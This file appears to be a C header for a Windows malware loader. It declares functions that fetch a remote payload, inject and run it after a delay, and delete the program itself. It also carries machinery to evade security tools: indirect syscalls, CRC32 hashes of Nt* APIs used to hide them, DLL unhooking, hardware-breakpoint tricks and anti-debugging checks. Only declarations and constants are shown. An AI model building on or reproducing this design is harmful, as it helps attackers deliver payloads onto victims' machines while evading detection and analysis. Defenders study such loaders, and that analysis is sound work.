#pragma once

#include <Windows.h>

#ifndef COMMON_H
#define COMMON_H

#define DELAY
#define curl_easy_init_CRC32     0xFA174BF0

//0xB4 3 mins
// 0x78 2 mins
// //0x3C 1mins
// CONSTANTS
#define PAYLOAD_EXEC_DELAY                  0x3C             // 3 mins delay before executing the payload - used in the 'ExecutePayload' function
#define CRC_POLYNOMIAL                      0xEDB88320      // Used for the CRC string hashing algo
#define	KEY_SIZE	                        0x20            // 32
#define	IV_SIZE		                        0x10            // 16
#define STATUS_OBJECT_NAME_NOT_FOUND        0xC0000034      // 'The object name is not found' - Returned by NtOpenSection in unhook.c if the dll is not found in \knowndlls\

// HASHES - Gemerated by HashCalculator

int HWBP();
BOOL SelfDelete();
BOOL NtDebuggerCheck();
BOOL HWBPCheck();
BOOL OutoutDebugStringCheck();
BOOL IsDebuggerPresent2();
BOOL IsDebuggerPresent3();
BYTE* FetchPayload(LPCWSTR baseAddress, LPCWSTR filename, PBYTE* ppResourceBuffer, SIZE_T* pSize);
BOOL SelfDelete();

//--------------------------
#define OVERWRITE_SIZE 0x500
#define IN3_INSTRUCTION_OPCODE 0xCC
#define ERROR_BUF_SIZE (MAX_PATH * 2)
//--------------------------

#define NtOpenSection_CRC32              0x709DE3CC
#define NtMapViewOfSection_CRC32         0xA4163EBC
#define NtProtectVirtualMemory_CRC32     0x5C2D1A97
#define NtUnmapViewOfSection_CRC32       0x90483FF6
#define NtAllocateVirtualMemory_CRC32    0xE0762FEB
#define NtDelayExecution_CRC32           0xF5A86278
#define NtWriteVirtualMemory_CRC32       0xE4879939
#define NtQuerySystemInformation_CRC32   0x97FD2398
#define LoadLibraryA_CRC32               0x3FC1BD8D
#define CreateThreadpoolTimer_CRC32      0xCC315CB0
#define SetThreadpoolTimer_CRC32         0x9B52D1CC
#define WaitForSingleObject_CRC32        0xE058BB45
#define AddVectoredExceptionHandler_CRC32        0x91765761
#define RemoveVectoredExceptionHandler_CRC32     0x8670F6CA

#define text_CRC32               0xA21C1EA3
#define win32udll_CRC32          0xA1CAB71E

#define kernel32dll_CRC32        0x6AE69F02
#define ntdlldll_CRC32   0x84C05E40



//--------------------------------------------------------------------------------------------------------------------------------------------------
// HELLSHALL.C



typedef struct _NT_SYSCALL
{
    DWORD dwSSn;                    // Syscall number
    DWORD dwSyscallHash;            // Syscall hash value
    PVOID pSyscallInstAddress;      // Address of a random 'syscall' instruction in win32u.dll    

}NT_SYSCALL, * PNT_SYSCALL;


BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys);
extern VOID SetSSn(IN DWORD dwSSn, IN PVOID pSyscallInstAddress);
extern RunSyscall();



#define SET_SYSCALL(NtSys)(SetSSn((DWORD)NtSys.dwSSn,(PVOID)NtSys.pSyscallInstAddress))

typedef struct _NT_API {


    NT_SYSCALL	NtOpenSection;
    NT_SYSCALL	NtMapViewOfSection;
    NT_SYSCALL	NtProtectVirtualMemory;
    NT_SYSCALL	NtUnmapViewOfSection;
    NT_SYSCALL  NtDelayExecution;
    NT_SYSCALL  NtAllocateVirtualMemory;
    NT_SYSCALL  NtWriteVirtualMemory;
    NT_SYSCALL  NtQuerySystemInformation;

    BOOL        bInit;

}NT_API, * PNT_API;

//--------------------------------------------------------------------------------------------------------------------------------------------------
// COMMON.C

BOOL InitIndirectSyscalls(OUT PNT_API Nt);
unsigned int GenerateRandomInt();
UINT32 CRC32B(LPCSTR cString);
VOID Wcscat(IN WCHAR* pDest, IN WCHAR* pSource);
VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength);

#define CRCHASH(STR)    ( CRC32B( (LPCSTR)STR ) )

//--------------------------------------------------------------------------------------------------------------------------------------------------
// UNHOOK.C

VOID UnhookAllLoadedDlls();
LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// APIHASHING.C

HMODULE GetModuleHandleH(IN UINT32 uModuleHash);
FARPROC GetProcAddressH(IN HMODULE hModule, IN UINT32 uApiHash);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// INJECT.C

BOOL InjectEncryptedPayload(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload);
VOID ExecutePayload(IN PVOID pInjectedPayload);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// RSRCPAYLOAD.C

BOOL GetResourcePayload(IN HMODULE hModule, IN WORD wResourceId, OUT PBYTE* ppResourceBuffer, OUT PDWORD pdwResourceSize);


#endif // !COMMON_H

